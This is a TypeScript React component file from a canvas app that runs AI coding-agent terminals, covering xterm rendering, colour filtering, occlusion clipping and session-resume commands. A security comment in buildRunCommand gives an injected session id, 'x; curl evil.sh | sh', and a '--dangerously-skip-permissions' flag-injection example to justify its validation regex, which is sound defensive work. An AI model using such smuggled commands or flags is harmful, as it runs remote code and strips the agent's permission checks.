import { memo, useEffect, useRef } from 'react'
import { Terminal } from '@xterm/xterm'
import { FitAddon } from '@xterm/addon-fit'
import { WebLinksAddon } from '@xterm/addon-web-links'
import type { WebglAddon } from '@xterm/addon-webgl'
import { CanvasNode, useCanvas, LOD_ZOOM } from '../store/canvas'
import {
  classifyChunkVisual,
  createClassifier,
  mapToVisual,
  stripAnsi,
  type AgentStatus
} from '../lib/agentStatus'
import { narrateTransition, narrateBaton, registerNodeSpawn, resetNarration } from '../lib/narration'
import * as termRegistry from '../lib/termRegistry'
import { submitToPty } from '../lib/ptySubmit'
import { detectUrls, maybeOpenPreview } from '../lib/previewWire'
import { useRelay } from '../store/relay'
import { useMission } from '../store/mission'
import { useScorecard } from '../store/scorecard'
import { useLens } from '../store/lens'
import { useEcho } from '../store/echo'
import { useTripwire } from '../store/tripwire'
import { useChangeset } from '../store/changeset'
import { useCheckpoints } from '../store/checkpoints'
import { useBoard } from '../store/board'
import { useRecall } from '../store/recall'
import { formatBoardForInjection } from '../lib/boardFormat'
import { matchRecall, recallBlock } from '../lib/recallMatch'
import { useCommandTrail } from '../store/commandTrail'
import { useCatchup } from '../store/catchup'
import { lastMeaningfulLine, isMeaningfulLine } from '../lib/lensExcerpt'
import { detectCommand } from '../lib/commandTrail'
import { harvestFrom } from '../lib/insightHarvest'
import { detectQuestion } from '../lib/openQuestion'
import { useQuestions } from '../store/questions'
import { frostRegister, frostUnregister } from './BackdropFrost'
import { t } from '../store/i18n'

// Height (world px) of the in-world node header. The terminal overlay box is the
// node BODY area only — it starts below the header. Must stay in sync with
// .node-header { height } in index.css.
const HEADER = 34

// ── Insight Harvester ────────────────────────────────────────────────────────
// Per-node throttle so an agent spewing many discovery-grade lines in a burst
// can only auto-pin to the Brief Board at most once every HARVEST_MIN_MS. Module
// scope (survives re-renders + remounts) keyed by node id; cleaned lazily — entries
// are tiny and the map is bounded by the number of live terminal nodes.
const HARVEST_MIN_MS = 4000
const lastHarvestAt = new Map<string, number>()
// Beacon — cap how many of the most-recent scrollback lines each terminal exposes
// to a canvas-wide content search (8000-line buffers × many terminals would be
// costly to scan in full on every keystroke; the recent tail is what users hunt).
const BEACON_MAX_LINES = 2000

// Open Questions: the same per-node throttle pattern as the harvester, so a node
// re-rendering a question line in a burst can only enqueue an Open Question card
// at most once every QUESTION_MIN_MS. Module scope, keyed by node id, cleaned on
// disposal alongside lastHarvestAt.
const QUESTION_MIN_MS = 4000
const lastQuestionAt = new Map<string, number>()

/**
 * Is auto-harvest enabled? Reads the same localStorage flag the SettingsPanel
 * toggle writes ('canvasio:harvest'). Default ON when unset, matching the pitch.
 */
function harvestEnabled(): boolean {
  try {
    return localStorage.getItem('canvasio:harvest') !== 'off'
  } catch {
    return true
  }
}

/**
 * Is Command Trail capture enabled? Reads the same localStorage flag the
 * SettingsPanel toggle writes ('canvasio:cmdtrail'). Default ON when unset,
 * mirroring harvestEnabled() above.
 */
function cmdTrailEnabled(): boolean {
  try {
    return localStorage.getItem('canvasio:cmdtrail') !== 'off'
  } catch {
    return true
  }
}

/**
 * Is Auto-recall on spawn enabled? Reads the same localStorage flag the
 * SettingsPanel toggle writes ('canvasio:recall'). Default ON when unset,
 * mirroring harvestEnabled() / cmdTrailEnabled() above.
 */
function recallEnabled(): boolean {
  try {
    return localStorage.getItem('canvasio:recall') !== 'off'
  } catch {
    return true
  }
}

// World-px corner radius of the node frame (--node-radius) and frame border
// width. The overlay's bottom corners must match the frame's rounded corners
// EXACTLY at any zoom, so we compute their screen radius as (NODE_RADIUS -
// BORDER) * zoom and apply it imperatively — a fixed CSS radius only lines up at
// zoom 1 and otherwise leaves a black notch at the corner.
const NODE_RADIUS = 14
const BORDER = 1

// Base font size at zoom === 1. At other zooms we use BASE_FONT * zoom so that
// FitAddon yields the SAME cols/rows as at zoom 1 (no TUI reflow) while the
// canvas backing store is rasterized at the scaled font for crisp glyphs.
const BASE_FONT = 12.5
const MIN_FONT = 4

// fontSize = BASE_FONT * zoom (fractional, never rounded) so cols/rows stay
// constant across zoom (cellW scales with the font). We apply only a lower
// safety clamp to avoid 0/negative font sizes at extreme zoom-out; we do NOT
// clamp the upper bound, since the box is at true device pixels with no CSS
// scale, so a large font is simply rendered larger and stays crisp.
const clampFont = (v: number): number => Math.max(MIN_FONT, v)

// Resolve the theme-overridable xterm glass tint from CSS vars so a theme
// (e.g. Obsidian) can darken the composite behind glyphs. Falls back to the
// historical rgba(6,11,22,0.30) when the vars are unset (default theme = identical).
function xtermGlassBg(): string {
  try {
    const cs = getComputedStyle(document.documentElement)
    const rgb = cs.getPropertyValue('--glass-xterm-tint').trim() || '6, 11, 22'
    const a = cs.getPropertyValue('--glass-xterm-alpha').trim() || '0.30'
    return `rgba(${rgb}, ${a})`
  } catch {
    return 'rgba(6, 11, 22, 0.30)'
  }
}

const THEME = {
  // Low-alpha tint (not opaque) so the frosted screen-space overlay box — and
  // through it the wallpaper — bleeds through behind the transparent WebGL
  // canvas. Composite alpha behind glyphs stays dark enough for ~4.5:1 body
  // text on a bright wallpaper. See allowTransparency:true below.
  background: 'rgba(6, 11, 22, 0.30)',
  foreground: '#dbe6ff',
  cursor: '#7aa2ff',
  cursorAccent: '#0b1326',
  selectionBackground: 'rgba(120,160,255,0.35)',
  // Codex uses ANSI black for its composer and user-turn surfaces. It must retain
  // enough opacity to distinguish those surfaces from assistant output, while the
  // rest of the terminal remains the translucent Liquid Glass base.
  black: 'rgba(7, 12, 23, 0.82)',
  red: '#ff6b6b',
  green: '#48d597',
  yellow: '#f2c84b',
  blue: '#5b8cff',
  magenta: '#c77dff',
  cyan: '#5ad1e8',
  white: '#d7e1f7',
  brightBlack: '#5b6887',
  brightRed: '#ff8a8a',
  brightGreen: '#76e6b0',
  brightYellow: '#ffe08a',
  brightBlue: '#8fb2ff',
  brightMagenta: '#dba6ff',
  brightCyan: '#8ce6f5',
  brightWhite: '#ffffff'
}

// UNIFIED SGR NORMALISER for the agent (Codex/Claude Code) PTY stream — replaces
// the two earlier partial filters (stripDarkBg, which only understood the SEMICOLON
// grammar, + stripUnderline). Agent TUIs shade blocks (recap, "Worked for…") with
// OPAQUE dark backgrounds; with no alpha they read as the "sombreado negro" / black
// rectangles over our translucent glass. The bug: dark bgs in the MODERN COLON
// grammar (48:2::r:g:b / 48:5:n, ISO 8613-6) slipped past stripDarkBg's `[0-9;]`
// regex entirely and still painted black.
//
// This single pass tokenises BOTH grammars (`;` and `:`) and:
//   • rewrites DARK backgrounds to 49 (default = transparent): standard 40/100,
//     dark 256 (0/16-19/232+), and dark/near-grey truecolor — in `;` AND `:` form;
//   • drops inverse-video (7), which xterm renders as another opaque per-cell
//     background even when the stream contains no `48` background colour;
//   • KEEPS coloured backgrounds (41-47/101-107, saturated 256/truecolor) that
//     carry meaning (diffs, syntax, status bars);
//   • DROPS underline/overline decorations (4, 4:n, 21, 53, 58/58:…) the TUIs draw
//     as dark rules over the glass;
//   • leaves FOREGROUND colours (38/38:…), bold, italic and resets byte-identical
//     (so the letters / structure never change).
function normalizeSgr(data: string): string {
  if (data.indexOf('\x1b[') === -1) return data
  // `:` is included so the colon (ISO 8613-6) grammar is matched, not just `;`.
  return data.replace(/\x1b\[([0-9;:]*)m/g, (full, body: string) => {
    if (body === '') return full // bare reset \x1b[m — keep verbatim
    const darkRGB = (r: number, g: number, b: number): boolean => {
      const mx = Math.max(r, g, b)
      const mn = Math.min(r, g, b)
      // near-grey darks (the block imprint) OR clearly-dark low-saturation fills;
      // saturated colours (high max / wide range) survive as meaningful bgs.
      return (mx < 110 && mx - mn < 40) || mx < 60
    }
    const dark256 = (n: number): boolean =>
      n === 0 || (n >= 16 && n <= 19) || (n >= 232 && n <= 240)
    const p = body.split(';')
    const out: string[] = []
    for (let i = 0; i < p.length; i++) {
      const v = p[i]
      // ── colon (ISO 8613-6) token: a single param carrying ':' sub-params ──
      if (v.indexOf(':') !== -1) {
        const s = v.split(':')
        const head = s[0]
        if (head === '48') {
          if (s[1] === '5') {
            out.push(dark256(+s[2] || 0) ? '49' : v)
          } else if (s[1] === '2') {
            // 48:2:<colorspace?>:r:g:b → r,g,b are the LAST three numeric subs
            const nums = s.slice(2).filter((x) => x !== '').map((x) => +x || 0)
            const r = nums[nums.length - 3] || 0
            const g = nums[nums.length - 2] || 0
            const b = nums[nums.length - 1] || 0
            out.push(darkRGB(r, g, b) ? '49' : v)
          } else {
            out.push(v)
          }
        } else if (head === '4' || head === '58') {
          // styled underline (4:n) / underline-colour (58:…) → drop the decoration
        } else {
          out.push(v) // 38:… foreground & anything else → keep
        }
        continue
      }
      // ── legacy semicolon tokens ──
      if (v === '48' && p[i + 1] === '2') {
        const r = +p[i + 2] || 0
        const g = +p[i + 3] || 0
        const b = +p[i + 4] || 0
        i += 4
        if (darkRGB(r, g, b)) out.push('49')
        else out.push('48', '2', String(r), String(g), String(b))
      } else if (v === '48' && p[i + 1] === '5') {
        const n = +p[i + 2] || 0
        i += 2
        if (dark256(n)) out.push('49')
        else out.push('48', '5', String(n))
      } else if (v === '38' && p[i + 1] === '2') {
        out.push('38', '2', p[i + 2], p[i + 3], p[i + 4])
        i += 4
      } else if (v === '38' && p[i + 1] === '5') {
        out.push('38', '5', p[i + 2])
        i += 2
      } else if (v === '40' || v === '100') {
        out.push('49') // dark standard bg (black / bright-black grey) → default
      } else if (v === '4' || v === '7' || v === '21' || v === '53') {
        // underline / inverse-video / double-underline / overline ENABLE → drop
        // the decoration. SGR 7 swaps fg/bg and is the remaining source of the
        // opaque black text blocks after explicit 48 backgrounds are normalized.
      } else if (v === '58') {
        if (p[i + 1] === '2') i += 4
        else if (p[i + 1] === '5') i += 2
        // underline-COLOUR selector → drop
      } else {
        out.push(v) // fg, coloured bg (41-47/101-107), bold/italic/off-codes → keep
      }
    }
    if (out.length === 0) return '' // all params were dropped decorations → drop seq
    return '\x1b[' + out.join(';') + 'm'
  })
}

// Preserve the liquid-glass base behind unstyled terminal cells. This is the
// only presentation control we intercept: all SGR styling (backgrounds, inverse,
// underline, italics, and colours) is passed through exactly as emitted by the
// agent TUI. OSC 11 queries remain intact so xterm can answer them normally.
function preserveGlassBackground(data: string): string {
  if (data.indexOf('\x1b]') === -1) return data
  // Only OSC 11 SET (default background), terminated by BEL (\x07) or ST (ESC \).
  return data.replace(/\x1b\]11;(?!\?)[^\x07\x1b]*(?:\x07|\x1b\\)/g, '')
}

interface ScreenRect {
  left: number
  top: number
  width: number
  height: number
  visible: boolean
}

/**
 * Compute the SCREEN-space rectangle of a node's BODY (the area below the
 * header) from the camera. Rounding MUST mirror Canvas.tsx's
 * `translate(Math.round(camera.x))` so the overlay tracks the in-world frame
 * with no 1px shimmer.
 *
 * `visible` is false when the body has no positive area at the current zoom (so
 * we can collapse the box and skip mounting work).
 */
function screenRectForNode(
  node: Pick<CanvasNode, 'x' | 'y' | 'w' | 'h'>,
  camera: { x: number; y: number; zoom: number }
): ScreenRect {
  const ox = Math.round(camera.x)
  const oy = Math.round(camera.y)
  const z = camera.zoom
  // The box spans the FULL frame width/height (no 1px inset). It used to inset by
  // the border so the in-world frame hairline showed around it — but that left a
  // 1px ring of NON-frosted (sharp-wallpaper) .node-body on the sides/bottom that
  // read as a thinner "second frost" band against the frosted body. The xterm is
  // now TRANSPARENT glass (not the old opaque canvas), so spanning the full frame
  // no longer "chafa" the border; the frost + tint now reach edge-to-edge and the
  // band is gone. Top still overlaps the header's bottom border by 1px.
  const left = Math.round(ox + node.x * z)
  const top = Math.round(oy + (node.y + HEADER) * z) - 1
  const right = Math.round(ox + (node.x + node.w) * z)
  const bottom = Math.round(oy + (node.y + node.h) * z)
  const width = right - left
  const height = bottom - top
  return { left, top, width, height, visible: width > 1 && height > 1 }
}

/**
 * Compute the SCREEN-space rectangle of a node's FULL frame (header + body +
 * borders), used to position the screen-space resize-handle overlay. Mirrors
 * Canvas.tsx's `translate(Math.round(camera.x))` rounding so the handles track
 * the in-world frame with no 1px shimmer.
 */
function screenRectForNodeFull(
  node: Pick<CanvasNode, 'x' | 'y' | 'w' | 'h'>,
  camera: { x: number; y: number; zoom: number }
): ScreenRect {
  const ox = Math.round(camera.x)
  const oy = Math.round(camera.y)
  const z = camera.zoom
  const left = Math.round(ox + node.x * z)
  const top = Math.round(oy + node.y * z)
  const right = Math.round(ox + (node.x + node.w) * z)
  const bottom = Math.round(oy + (node.y + node.h) * z)
  const width = right - left
  const height = bottom - top
  return { left, top, width, height, visible: width > 1 && height > 1 }
}

/**
 * Build a CSS clip-path that cuts a HOLE in this terminal's screen box wherever a
 * HIGHER-stacking-order node overlaps it (ANY kind: terminal, music, web,
 * markdown, folder — INCLUDING collapsed file-icon chips and the visible music
 * webview). The overlay is composited above the transformed world, so a front
 * window — whose header/border frame AND body (music webview, folder browser,
 * markdown content) live only in the world layer (below the z-30 overlay) —
 * cannot otherwise cover a back terminal. Instead of hiding the whole terminal
 * (which exposed the node body's solid blue), we keep it visible everywhere
 * EXCEPT under the front window, where the in-world frame/body (and, for a front
 * terminal, its own higher-z overlay box) shows through the hole.
 *
 * Stacking order is determined by the NODES ARRAY iteration order (later indices
 * = visually higher), the single source maintained by bringToFront/updateNode —
 * NOT the raw node.z field. A non-terminal window that sits above this terminal
 * in the array now cuts a hole so the back terminal's opaque xterm <canvas> does
 * not bleed over it visually.
 *
 * Coordinates are in the box's local px space.
 *
 * VISIBLE-REGION (rectangle-subtraction) clip — NOT overlapping evenodd holes.
 * The old approach cut one evenodd hole per front occluder. When TWO+ front
 * windows overlapped each other, the region covered by BOTH holes was inside an
 * EVEN number of subpaths, so `evenodd` FILLED it again → the back terminal's
 * opaque xterm <canvas> bled through in that doubly-covered overlap. The fix:
 * compute the terminal's visible region = box MINUS the union of all front
 * occluders, decomposed into NON-OVERLAPPING rectangles, then emit a clip-path
 * that INCLUDES exactly those rects. Because the visible rects never overlap,
 * each pixel is inside at most one subpath and the fill-rule can't cancel — the
 * bleed is impossible for ANY number of overlapping occluders.
 *
 * Returns 'none' when nothing is occluded (full box visible — identical to the
 * old behavior). Returns a zero-area clip when the box is FULLY covered, which
 * hides the terminal (and stops it receiving pointer events).
 *
 * Clipped-away regions stop receiving pointer events, so clicks fall through to
 * the front window. O(N*M) on change (N occluders, M visible rects ≤ ~4N) —
 * cheap at the app's node counts.
 */
interface VisRect {
  x: number
  y: number
  w: number
  h: number
}

// Subtract the union of `occluders` (local box coords, {x0,y0,x1,y1}) from the
// A COLLAPSED node renders in-world as a 72×72 icon chip (NodeView), NOT its
// stored window w/h. This must stay byte-for-byte aligned with NodeView's
// COLLAPSED_CHIP_W/H: the terminal overlay punches an occlusion hole using these
// dimensions, so a stale size visibly clips an icon that is logically in front.
const COLLAPSED_CHIP_W = 72
const COLLAPSED_CHIP_H = 72
function effNodeW(n: CanvasNode): number {
  return n.collapsed ? COLLAPSED_CHIP_W : n.w
}
function effNodeH(n: CanvasNode): number {
  return n.collapsed ? COLLAPSED_CHIP_H : n.h
}

// terminal box, returning the visible area as a set of NON-OVERLAPPING rects.
// Each occluder slices every current visible rect it intersects into up to 4
// non-overlapping remainder rects (top/bottom/left/right of the intersection).
function computeVisibleRects(
  box: VisRect,
  occluders: Array<{ x0: number; y0: number; x1: number; y1: number }>
): VisRect[] {
  let visible: VisRect[] = [box]
  for (const occ of occluders) {
    const next: VisRect[] = []
    for (const rect of visible) {
      const ix0 = Math.max(rect.x, occ.x0)
      const iy0 = Math.max(rect.y, occ.y0)
      const ix1 = Math.min(rect.x + rect.w, occ.x1)
      const iy1 = Math.min(rect.y + rect.h, occ.y1)
      if (ix1 <= ix0 || iy1 <= iy0) {
        // No overlap — this rect survives unchanged.
        next.push(rect)
        continue
      }
      // Top slice (full width, above the intersection).
      if (rect.y < iy0) next.push({ x: rect.x, y: rect.y, w: rect.w, h: iy0 - rect.y })
      // Bottom slice (full width, below the intersection).
      if (rect.y + rect.h > iy1)
        next.push({ x: rect.x, y: iy1, w: rect.w, h: rect.y + rect.h - iy1 })
      // Left slice (within the intersection's vertical span).
      if (rect.x < ix0) next.push({ x: rect.x, y: iy0, w: ix0 - rect.x, h: iy1 - iy0 })
      // Right slice (within the intersection's vertical span).
      if (rect.x + rect.w > ix1)
        next.push({ x: ix1, y: iy0, w: rect.x + rect.w - ix1, h: iy1 - iy0 })
    }
    visible = next
    if (visible.length === 0) break // Fully occluded — stop early.
  }
  return visible
}

// A higher-z window that covers part of this terminal, in the box's LOCAL px
// space, WITH per-corner radii: a corner is rounded ONLY where the intersection
// meets the occluding window's OWN rounded frame corner. Subtracting this rounded
// shape (instead of its bounding rect) leaves the back terminal's glass intact in
// the front window's rounded-corner triangles — no black/glass "piquitos" — while
// interior cuts (edges produced by clipping to THIS box) stay square and flush.
type OcclHole = {
  x0: number
  y0: number
  x1: number
  y1: number
  tl: number
  tr: number
  br: number
  bl: number
}

// Every higher-z window covering this terminal, as rounded occlusion holes.
// node.z — NOT array index — is the canonical stacking source (bringToFront bumps
// z without reordering the array). Includes EVERY kind in front (terminal, music,
// folder, markdown, web, collapsed chip); MUST mirror makeOcclusionGuard's set.
function occludersForBox(
  node: CanvasNode,
  nodes: CanvasNode[],
  camera: { x: number; y: number; zoom: number },
  box: ScreenRect
): OcclHole[] {
  const z = camera.zoom
  const ox = Math.round(camera.x)
  const oy = Math.round(camera.y)
  const fr = NODE_RADIUS * z // the occluding FRAME's screen corner radius
  const EPS = 0.75
  const holes: OcclHole[] = []
  for (const other of nodes) {
    if (other.id === node.id) continue
    if (other.z <= node.z) continue
    const bL = ox + other.x * z
    const bT = oy + other.y * z
    const bR = bL + effNodeW(other) * z
    const bB = bT + effNodeH(other) * z
    const iL = Math.max(box.left, bL)
    const iT = Math.max(box.top, bT)
    const iR = Math.min(box.left + box.width, bR)
    const iB = Math.min(box.top + box.height, bB)
    if (iR <= iL || iB <= iT) continue
    const atL = Math.abs(iL - bL) < EPS
    const atT = Math.abs(iT - bT) < EPS
    const atR = Math.abs(iR - bR) < EPS
    const atB = Math.abs(iB - bB) < EPS
    holes.push({
      x0: Math.round(iL - box.left),
      y0: Math.round(iT - box.top),
      x1: Math.round(iR - box.left),
      y1: Math.round(iB - box.top),
      tl: atL && atT ? fr : 0,
      tr: atR && atT ? fr : 0,
      // BOTTOM CORNERS: round if they coincide with the occluder's own frame
      // corner (atR/atB), OR if the hole reaches the BACK box's bottom edge AND
      // its right/left edge — i.e. it lands on the box's own rounded-bottom arc.
      // Without this, an occluder entering laterally leaves a SQUARE hole corner
      // inside the box's curved band; evenodd then subtracts a rectangle from a
      // rounded outer and a thin triangular sliver of glass remains visible (the
      // "piquito"). Matching the hole's arc to the outer's br removes it. The
      // double edge-test (box bottom AND box side) prevents rounding an interior
      // cut that only grazes box.bottom by chance; coverage by another occluder
      // is still squared by nonOverlappingHoles, so triple-overlap can't leak.
      br:
        (atR && atB) ||
        (Math.abs(iR - (box.left + box.width)) < EPS &&
          Math.abs(iB - (box.top + box.height)) < EPS)
          ? fr
          : 0,
      bl:
        (atL && atB) ||
        (Math.abs(iL - box.left) < EPS &&
          Math.abs(iB - (box.top + box.height)) < EPS)
          ? fr
          : 0
    })
  }
  return nonOverlappingHoles(holes)
}

// Slice rect A by removing the part inside rect B -> up to 4 non-overlapping
// remainder rects (mirrors computeVisibleRects' slicing).
function subtractRect(
  a: { x0: number; y0: number; x1: number; y1: number },
  b: { x0: number; y0: number; x1: number; y1: number }
): Array<{ x0: number; y0: number; x1: number; y1: number }> {
  const ix0 = Math.max(a.x0, b.x0)
  const iy0 = Math.max(a.y0, b.y0)
  const ix1 = Math.min(a.x1, b.x1)
  const iy1 = Math.min(a.y1, b.y1)
  if (ix1 <= ix0 || iy1 <= iy0) return [a] // no overlap — survives whole
  const out: Array<{ x0: number; y0: number; x1: number; y1: number }> = []
  if (a.y0 < iy0) out.push({ x0: a.x0, y0: a.y0, x1: a.x1, y1: iy0 })
  if (a.y1 > iy1) out.push({ x0: a.x0, y0: iy1, x1: a.x1, y1: a.y1 })
  if (a.x0 < ix0) out.push({ x0: a.x0, y0: iy0, x1: ix0, y1: iy1 })
  if (a.x1 > ix1) out.push({ x0: ix1, y0: iy0, x1: a.x1, y1: iy1 })
  return out
}

// Make occluder holes NON-OVERLAPPING. CRITICAL: the clip + frost subtract holes
// via an evenodd path — if two front windows overlap EACH OTHER over this
// terminal ("triple solapamiento"), evenodd toggles their shared region twice
// and it fills back in, leaking the back terminal through. We slice each occluder
// against the ones already placed so the holes tile with no overlap; a surviving
// piece keeps a corner's radius ONLY if that corner is still the occluder's
// original (rounded) frame corner (clipped corners go square — they're occluded).
function nonOverlappingHoles(occ: OcclHole[]): OcclHole[] {
  // Pre-pass: SQUARE any rounded corner that ANOTHER occluder covers. There the
  // back terminal must stay hidden (a window is in front of it), so this hole must
  // INCLUDE that corner triangle. Leaving it rounded (= terminal visible in the
  // triangle) while the slicing below removes the other occluder's coverage of it
  // leaks the terminal through — the "triple solapamiento" piquito. A corner with
  // no other occluder over it stays rounded (the single-occluder anti-piquito).
  const adj = occ.map((o) => ({ ...o }))
  const covers = (q: OcclHole, x: number, y: number): boolean =>
    x > q.x0 && x < q.x1 && y > q.y0 && y < q.y1
  for (let i = 0; i < adj.length; i++) {
    const o = adj[i]
    for (let j = 0; j < occ.length; j++) {
      if (j === i) continue
      const q = occ[j]
      if (o.tl && covers(q, o.x0 + 1, o.y0 + 1)) o.tl = 0
      if (o.tr && covers(q, o.x1 - 1, o.y0 + 1)) o.tr = 0
      if (o.br && covers(q, o.x1 - 1, o.y1 - 1)) o.br = 0
      if (o.bl && covers(q, o.x0 + 1, o.y1 - 1)) o.bl = 0
    }
  }
  const result: OcclHole[] = []
  const placed: Array<{ x0: number; y0: number; x1: number; y1: number }> = []
  for (const o of adj) {
    let pieces = [{ x0: o.x0, y0: o.y0, x1: o.x1, y1: o.y1 }]
    for (const p of placed) {
      const next: typeof pieces = []
      for (const pc of pieces) next.push(...subtractRect(pc, p))
      pieces = next
    }
    for (const pc of pieces) {
      result.push({
        x0: pc.x0,
        y0: pc.y0,
        x1: pc.x1,
        y1: pc.y1,
        tl: pc.x0 === o.x0 && pc.y0 === o.y0 ? o.tl : 0,
        tr: pc.x1 === o.x1 && pc.y0 === o.y0 ? o.tr : 0,
        br: pc.x1 === o.x1 && pc.y1 === o.y1 ? o.br : 0,
        bl: pc.x0 === o.x0 && pc.y1 === o.y1 ? o.bl : 0
      })
    }
    placed.push({ x0: o.x0, y0: o.y0, x1: o.x1, y1: o.y1 })
  }
  return result
}

// Rounded-rect SVG path (box-local) with four INDEPENDENT corner radii; a 0
// radius emits a sharp corner (the H/V line reaches it, no arc). Shared by the
// occlusion clip (here) and conceptually mirrors BackdropFrost's rrPath.
function rrPathLocal(
  x: number,
  y: number,
  w: number,
  h: number,
  tl: number,
  tr: number,
  br: number,
  bl: number
): string {
  const c = (n: number): number => Math.max(0, Math.min(n, w / 2, h / 2))
  tl = c(tl)
  tr = c(tr)
  br = c(br)
  bl = c(bl)
  return (
    `M${x + tl} ${y}` +
    `H${x + w - tr}` +
    (tr ? `A${tr} ${tr} 0 0 1 ${x + w} ${y + tr}` : '') +
    `V${y + h - br}` +
    (br ? `A${br} ${br} 0 0 1 ${x + w - br} ${y + h}` : '') +
    `H${x + bl}` +
    (bl ? `A${bl} ${bl} 0 0 1 ${x} ${y + h - bl}` : '') +
    `V${y + tl}` +
    (tl ? `A${tl} ${tl} 0 0 1 ${x + tl} ${y}` : '') +
    'Z'
  )
}

function clipPathForBox(
  node: CanvasNode,
  nodes: CanvasNode[],
  camera: { x: number; y: number; zoom: number },
  box: ScreenRect
): string {
  // A front window's HEADER + 1px border ring AND its body live IN-WORLD (below
  // the z-30 overlay). Without cutting its rect the back terminal's opaque xterm
  // <canvas> would paint over the front ("se chafan"). We cut the occluder's
  // ROUNDED shape so the back's glass survives in the front's rounded-corner
  // triangles (seamless) and the front's in-world body/overlay fills the rest.
  const holes = occludersForBox(node, nodes, camera, box)
  if (!holes.length) return 'none'
  // Fully-covered check via plain rectangular subtraction (the rounded-corner
  // slivers we'd otherwise keep are sub-pixel — negligible for "render nothing").
  const covered = computeVisibleRects(
    { x: 0, y: 0, w: box.width, h: box.height },
    holes.map((hl) => ({ x0: hl.x0, y0: hl.y0, x1: hl.x1, y1: hl.y1 }))
  )
  if (covered.length === 0) return 'path("M0 0Z")'
  const br = Math.max(0, NODE_RADIUS * camera.zoom)
  // Outer = this box's shape (square top against the header, rounded bottom).
  // Holes = each occluder as a ROUNDED rect; evenodd punches them out.
  let d = rrPathLocal(0, 0, box.width, box.height, 0, 0, br, br)
  for (const hl of holes) {
    d += rrPathLocal(hl.x0, hl.y0, hl.x1 - hl.x0, hl.y1 - hl.y0, hl.tl, hl.tr, hl.br, hl.bl)
  }
  return `path(evenodd, '${d}')`
}

// Decide what command (if any) a terminal should auto-run when it mounts.
//
// Session RECOVERY is the key behavior: a node restored from a saved layout
// (`fresh` falsy) does NOT start a blank agent — it RESUMES the conversation it
// had before, using the persisted `sessionId`.
//   - Claude: fresh -> `claude --session-id <preassigned-uuid>` (the uuid is
//             minted at node-create time in store/canvas.ts addNode); restored ->
//             resume that same uuid with a graceful shell `||` fallback.
//   - Codex : fresh -> `codex` (its id is captured afterwards, see below);
//             restored -> resume, with a graceful shell `||` fallback.
//   - cursor/custom/shell: only auto-run the raw command when fresh.
//
// `claude --session-id <preassigned-uuid>` IS NOW RELIABLE FOR FRESH. A previous
// iteration believed interactive claude did not persist a resumable transcript
// under a pre-assigned id (the ~/.claude/projects/<cwd>/<uuid>.jsonl was never
// written, only an empty `memory/` subdir) and worked around it by capturing
// claude's self-minted id from ~/.claude/history.jsonl. EMPIRICAL ROOT CAUSE
// (claude 2.1.179): that only happened because CanvasIO, when launched from
// within an existing Claude Code session, propagated CLAUDECODE=1 /
// CLAUDE_CODE_CHILD_SESSION=1 to the PTY, and claude DISABLES transcript writes
// in a child/nested context. src/main/pty.ts now sets
// CLAUDE_CODE_FORCE_SESSION_PERSISTENCE=1 and strips those inherited markers, so
// an interactive `claude --session-id <uuid>` writes <uuid>.jsonl
// (entrypoint:cli, promptSource:typed) under the EXACT preset id and
// `claude --resume <uuid>` resolves it cleanly. No history.jsonl capture needed.
//
// RESTORE FALLBACK: a captured id is only resumable once a real conversation
// happened. If resume still fails (e.g. the dir's session was pruned), the
// command `||` falls through to a fresh blank `claude` so the user never sees the
// raw "No conversation found" error. claude exits non-zero when the session is
// missing, which drops the shell to the fallback:
//   - claude, with id: `claude --resume <id> || claude`
//   - claude, no id:   `claude --continue || claude`
//   - codex,  with id: `codex resume <id> || codex`
//   - codex,  no id:   `codex resume --last || codex`
function buildRunCommand(node: CanvasNode): string | undefined {
  const fresh = node.fresh === true
  // SECURITY: sessionId is interpolated UNQUOTED into a shell command that the
  // PTY login shell evaluates (see src/main/pty.ts). A restored/imported layout
  // can carry a hand-edited sessionId like `x; curl evil.sh | sh`, so we MUST
  // validate it before use — matching the same guard the main process applies in
  // ai.ts/doctor.ts. The pattern also forbids a LEADING HYPHEN so a crafted id like
  // `--dangerously-skip-permissions` can't be interpreted as a CLI flag (argument
  // injection); all legitimate UUID/CLI session ids start alphanumeric and are
  // unchanged. An invalid id is dropped and we fall back to the no-id branch.
  const sid =
    typeof node.sessionId === 'string' && /^[A-Za-z0-9][A-Za-z0-9-]{0,63}$/.test(node.sessionId)
      ? node.sessionId
      : undefined
  // Claude's `--session-id` strictly requires a valid v4 UUID (empirically: a
  // non-UUID id is rejected with "Invalid session ID. Must be a valid UUID." and
  // exit 1). The general `sid` guard above is deliberately loose to also accept
  // codex's ids, so for claude we additionally require a real UUID shape before
  // feeding it to `--session-id`; otherwise we'd silently launch a broken command.
  const claudeSid = sid && /^[0-9a-fA-F]{8}(-[0-9a-fA-F]{4}){3}-[0-9a-fA-F]{12}$/.test(sid) ? sid : undefined
  if (node.agent === 'claude') {
    // FRESH: start a brand-new conversation under the pre-assigned UUID so the
    // very first restore can `--resume` it. This is reliable now that the PTY
    // forces transcript persistence (CLAUDE_CODE_FORCE_SESSION_PERSISTENCE=1 in
    // src/main/pty.ts — see the block comment above). If for any reason no valid
    // UUID is available, fall back to letting claude mint its own id.
    if (fresh) return claudeSid ? `claude --session-id ${claudeSid}` : 'claude'
    // RESTORE: resume the captured real id. Fall back to plain `claude` (a fresh
    // blank session) if resume fails so the user never sees claude's raw
    // "No conversation found with session ID: <id>" error.
    return claudeSid ? `claude --resume ${claudeSid} || claude` : 'claude --continue || claude'
  }
  if (node.agent === 'codex') {
    if (fresh) return 'codex'
    return sid ? `codex resume ${sid} || codex` : 'codex resume --last || codex'
  }
  return fresh ? node.command : undefined
}

/**
 * Single terminal mounted in a SCREEN-SPACE overlay box (a sibling of
 * .canvas-world, NOT inside the CSS-transformed world). The box is positioned at
 * integer device-pixel coordinates with NO CSS scale and NO rounded/overflow
 * render surface scaling above the xterm <canvas>, so the canvas composites 1:1
 * at ANY camera zoom (>1 and <1) and stays crisp.
 *
 * All terminal functionality (spawn/type/resize/status/narration/preview/
 * pendingPrompt/fresh) is identical to the previous in-world TerminalView — only
 * the mount location and the geometry math (screen-space rect + fontSize*zoom
 * instead of a counter-scale) changed.
 */
// Shared hot-path occlusion guard for the store-wide applyRect subscriptions in
// both TerminalBox and ResizeBox. The store subscription fires on EVERY store
// change (status flips during agent streaming, theme/selection/volume, etc.),
// but only this node's geometry + camera, or a higher-z occluder's geometry, can
// change the applied rect / clipPath. Each effect creates one guard instance
// (which holds its own lastSelfKey/lastOcc snapshot) and calls it at the top of
// applyRect: it returns true when nothing relevant moved (caller bails), else it
// updates the snapshot and returns false (caller falls through to the full
